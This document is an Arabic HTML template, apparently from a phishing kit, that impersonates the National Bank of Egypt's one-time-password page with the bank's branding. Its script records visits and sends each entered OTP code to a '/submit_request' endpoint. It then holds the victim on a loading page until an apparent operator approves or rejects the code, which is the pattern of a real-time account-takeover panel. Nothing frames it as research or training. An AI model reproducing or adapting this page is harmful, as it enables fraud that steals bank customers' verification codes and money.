<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>البنك الأهلي - رمز التحقق (OTP)</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <link rel="stylesheet" href="{{ url_for('static', filename='login-theme.css') }}">
</head>
<body>

<header class="site-header">
    <div class="header-right">
        <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="البنك الأهلي المصري">
    </div>
    <div class="header-left">
        <a href="otp_en.html" class="lang-switcher">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="9"></circle><path d="M3 12h18M12 3c2.3 2.5 3.5 5.5 3.5 9s-1.2 6.5-3.5 9c-2.3-2.5-3.5-6.5-3.5-9S9.7 5.5 12 3z"></path></svg>
            <span>English</span>
        </a>
        <a href="password.html" style="color: #888; margin-right: 10px; font-size: 20px;"><i class="fas fa-chevron-left"></i></a>
    </div>
</header>

<main class="login-shell">
    <div class="login-card-container">
        <div class="card-logo">
            <img src="{{ url_for('static', filename='static_nbe_logo_full.png') }}" alt="البنك الأهلي المصري">
        </div>

        <h2 style="margin-bottom: 10px; color: #333;">رمز التحقق (OTP)</h2>
        <p style="margin-bottom: 25px; color: #666; font-size: 14px;">تم إرسال رمز التحقق المكون من أرقام إلى رقم الهاتف المسجل الخاص بك. يرجى إدخال الرمز للمتابعة.</p>

        <section class="login-card">
            <div id="errorMessage" role="alert" style="display:none; color: red; margin-bottom: 15px; font-size: 14px;"></div>
            <form id="otpForm">
                <div class="form-group">
                    <input type="tel" id="otp_code" name="otp_code" class="form-control" placeholder="------" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;" inputmode="numeric" pattern="[0-9]*" oninput="this.value = this.value.replace(/[^0-9]/g, '')" required autofocus>
                </div>
                
                <div style="text-align: right; margin-bottom: 20px;">
                    <a href="#" style="color: #006b4f; text-decoration: underline; font-size: 14px; font-weight: bold;">إعادة إرسال الرمز؟</a>
                </div>

                <div class="submit-actions">
                    <button type="submit" class="submit-btn" id="submitBtn">تأكيد الرمز</button>
                </div>
            </form>
        </section>
    </div>
</main>

<script>
// تتبع الزيارة
fetch('/track_visit', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ action: 'track_visit', page: 'otp' })
}).catch(e => console.error(e));

document.getElementById("otpForm").addEventListener("submit", async function(event) {
    event.preventDefault();
    const otpCode = document.getElementById("otp_code").value;
    const btn = document.getElementById("submitBtn");
    const errorMessageDiv = document.getElementById("errorMessage");

    btn.disabled = true;
    btn.innerText = "جاري المعالجة...";

    try {
        const response = await fetch("/submit_request", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
                type: "otp",
                data: { otp_code: otpCode }
            })
        });

        const result = await response.json();
        if (result.status === "pending" || result.status === "approved") {
            localStorage.setItem("request_id", result.request_id);
            window.location.href = "otp_loading.html?request_id=" + result.request_id;
        } else {
            errorMessageDiv.textContent = result.message || "الرمز غير صحيح";
            errorMessageDiv.style.display = "block";
            btn.disabled = false;
            btn.innerText = "تأكيد الرمز";
        }
    } catch (error) {
        errorMessageDiv.textContent = "حدث خطأ أثناء الاتصال بالخادم";
        errorMessageDiv.style.display = "block";
        btn.disabled = false;
        btn.innerText = "تأكيد الرمز";
    }
});

// التحقق من وجود خطأ سابق
const urlParams = new URLSearchParams(window.location.search);
if (urlParams.get("rejected") === "true") {
    const errorDiv = document.getElementById("errorMessage");
    errorDiv.textContent = "الرمز الذي تم إدخاله غير صحيح، يرجى إعادة المحاولة";
    errorDiv.style.display = "block";
}
</script>
</body>
</html>
